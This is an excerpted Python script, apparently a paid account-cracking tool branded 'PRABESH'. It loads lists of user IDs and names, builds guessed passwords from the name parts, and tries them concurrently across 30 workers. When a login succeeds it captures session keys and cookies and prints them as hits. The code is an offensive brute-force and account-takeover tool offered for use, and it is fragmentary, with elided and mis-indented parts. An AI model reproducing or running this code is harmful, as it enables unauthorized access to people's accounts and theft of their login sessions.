...
sys.stdout.write('\x1b]2; prabesh\x07')
...
def meyexudi():
  ...
  id = "PRABESH-BRAND".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/PRABESH-EXE/PRABESH-EXE/blob/main/Approval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
os.system('espeak -a 300 " Welcome,   to,  PRABESH HERO,  PAID,   Tools"')
def back():
	login()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/prabesh.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop            
            sys.stdout.write(f"\r{G1}[{A}PRABESH-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}PRABESH-OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);prabeshb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={prabeshb};{ckkk}"
                    print(f"\r\r{G1}[PRABESH-OK] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} NEPAL10-20/INDIA 3-5');linex()
            ...
            linex()
            with Habib(max_workers=30) as prabeshworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                prabeshworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                prabeshworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
